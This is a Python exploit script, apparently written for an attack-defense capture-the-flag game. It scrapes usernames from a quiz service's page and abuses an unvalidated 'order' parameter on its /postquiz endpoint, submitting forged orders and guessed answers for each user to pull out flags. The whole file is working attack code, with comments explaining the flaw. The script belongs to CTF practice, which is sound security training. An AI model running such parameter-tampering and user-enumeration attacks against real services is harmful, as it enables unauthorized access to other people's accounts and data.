#!/usr/bin/env python3

# we can post 'order' param to /postquiz route
# so we can post for example '1,1,1,1,...' string and answer 'yyyy...' - with 50% propability we get the flag
# this sploit generates random order from two ids and try post 4 variants of answer

from libsplo import *
import sys
import re
import random
import string

st = DictStorage(RedisConnector("loli_order", "redis://redis.kappactf.ru"))
ip = sys.argv[1]

resp = requests.get(f"http://{ip}:4242/").text
users = re.findall(r'<th scope="row" class="align-middle">(.*)</th><td class="align-middle">30', resp)
users = set(users)

users -= set(st.keys())

for user in users:
	fl = random.randint(0, 29)
	sl = random.randint(0, 29)
	order = [str(random.choice([fl, sl])) for _ in range(30)]
	fanswer = ['y' if i == str(fl) else 'n' for i in order]
	sanswer = ['y' if i == str(sl) else 'n' for i in order]
	order = ','.join(order)
	answers = [''.join(fanswer), ''.join(sanswer), 'y' * 30, 'n' * 30]

	for answer in answers:
        	resp = requests.get(f"http://{ip}:4242/postquiz", params={
			"name" : user,
			"answer" : answer,
			"order" : order,
		}).text
        	print(resp, flush=True)
	st.set(user, "1")
